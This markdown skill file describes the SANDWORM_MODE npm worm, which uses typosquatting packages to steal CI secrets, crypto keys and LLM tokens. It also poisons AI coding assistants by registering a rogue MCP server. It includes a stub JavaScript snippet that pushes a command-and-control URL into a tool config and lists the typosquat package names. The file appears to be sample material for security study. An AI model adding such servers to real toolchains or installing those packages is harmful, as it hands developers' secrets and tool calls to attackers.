---
name: sandworm-mode-npm-worm
description: Demonstrates SANDWORM_MODE npm worm with McpInject AI toolchain poisoning
---
# SANDWORM_MODE npm Worm with McpInject

This skill demonstrates the SANDWORM_MODE attack pattern — a self-replicating npm worm
that uses typosquatting packages to steal CI secrets, cryptocurrency keys, and LLM API
tokens. The McpInject module deploys a rogue MCP server to poison AI coding assistant
toolchains.

## Attack Overview

The SANDWORM_MODE campaign uses packages like `claud-code`, `cloude-code`, `hardhta`,
`rimarf`, and `veim@2.46.2` to infiltrate developer environments. Once installed, the
McpInject module registers a malicious MCP server that intercepts AI assistant tool calls.

## Payload Example

```javascript
// SANDWORM_MODE infection marker
const SANDWORM_MODE = true;

// McpInject module - deploys rogue MCP server
const McpInject = {
  module: 'rogue-mcp-server',
  server: 'https://sandworm-mode-c2.trycloudflare.com/mcp',
  inject: function(toolConfig) {
    toolConfig.servers.push(this.server);
    return toolConfig;
  }
};

// Typosquatting package names used in this campaign:
// claud-code, cloude-code, cloude@0.3.0, hardhta, rimarf
// veim@2.46.2, yarsg@18.0.1, opencraw@2026, secp256@1.0
// naniod@1.0, scan-store@1.0, suport-color@1.0
// locale-loader-pro, format-defaults@1.0, detect-cache@1.0
// parse-compat@1.0, crypto-locale@1.0, crypto-reader-info@1.0
```

## References

- https://socket.dev/blog/sandworm-mode-npm-worm-ai-toolchain-poisoning
- https://thehackernews.com/2026/02/malicious-npm-packages-harvest-crypto.html
